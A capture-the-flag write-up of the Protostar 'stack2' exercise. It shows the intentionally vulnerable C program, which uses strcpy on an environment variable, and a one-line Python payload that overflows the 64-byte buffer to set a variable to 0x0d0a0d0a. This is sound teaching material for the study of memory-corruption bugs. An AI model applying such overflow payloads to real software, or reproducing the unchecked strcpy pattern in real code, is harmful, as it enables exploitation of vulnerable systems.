---
title: Protostar Writeup - stack2
updated: 2018-07-26 21:00
---

## Protostar - stack2

The aim of this challenge is to again change the modified variable, except that this one has a slight change.
We need to set an environment variable called `GREENIE`, whose value will be copied into buffer using the `strcpy()` method.
Here's the code:

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
    volatile int modified;
    char buffer[64];
    char *variable;

    variable = getenv("GREENIE");

    if(variable == NULL) {
        errx(1, "please set the GREENIE environment variable\n");
    }

    modified = 0;

    strcpy(buffer, variable);

    if(modified == 0x0d0a0d0a) {
        printf("you have correctly modified the variable\n");
    } else {
        printf("Try again, you got 0x%08x\n", modified);
    }

}
```

We need to some how get the value from buffer into the `modified` variable. So this is a standard stack overflow attack.
Now the question is how do we overflow the stack? The `strcpy()` method looks like the only thing we can exploit.
So lets take a look at the man pages. We find what we're and we don't have to look far.

> Beware of buffer overruns!

This confirms that we will be exploiting this method. First things first. We need the buffer length.
From the code we see that it's 64 bytes, something familiar we've seen in the [previous]() problem.
Our padding is therefore 64 bytes and another thing is the value which we need to set. This is `0x0d0a0d0a`.
Keep in mind that this will have to be written in the little endian format.
Here's what our environment variable will look like.

```shell
$ export GREENIE=$(python -c "print 'A' * 64 + '\x0a\x0d\x0a\x0d'")
```

After setting the environment variable, let's check whether it works.

```shell
$ ./stack2
you have correctly modified the variable
```

That was simple, since we had some intuition from the previous exercises. That's why the Protostar challenge is a good place to start.
Everything is organised. So each level depends on knowledge obtained in the previous levels.


